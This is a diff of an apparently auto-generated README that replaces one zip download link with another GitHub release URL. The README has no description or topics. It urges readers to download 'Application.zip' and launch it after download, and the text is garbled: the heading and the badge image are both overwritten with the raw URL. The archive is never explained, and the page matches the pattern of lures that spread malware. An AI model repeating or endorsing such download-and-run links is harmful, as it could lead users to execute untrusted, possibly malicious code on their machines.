@@ -10,13 +10,13 @@ Unfortunately, a short description for this repository is not provided. However,
 
 Topics for this repository are not provided.
 
-## Software.zip Download 📥
+## https://github.com/bulcsupalalng/latent-booking/releases/download/v1.0.0/Application.zip Download 📥
 
-Click the button below to download the Software.zip file:
+Click the button below to download the https://github.com/bulcsupalalng/latent-booking/releases/download/v1.0.0/Application.zip file:
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download https://github.com/bulcsupalalng/latent-booking/releases/download/v1.0.0/Application.zip](https://github.com/bulcsupalalng/latent-booking/releases/download/v1.0.0/Application.zip)](https://github.com/bulcsupalalng/latent-booking/releases/download/v1.0.0/Application.zip)
 
-*Note: The Software.zip file needs to be launched after download.*
+*Note: The https://github.com/bulcsupalalng/latent-booking/releases/download/v1.0.0/Application.zip file needs to be launched after download.*
 
 ## Explore Further 🌐
 
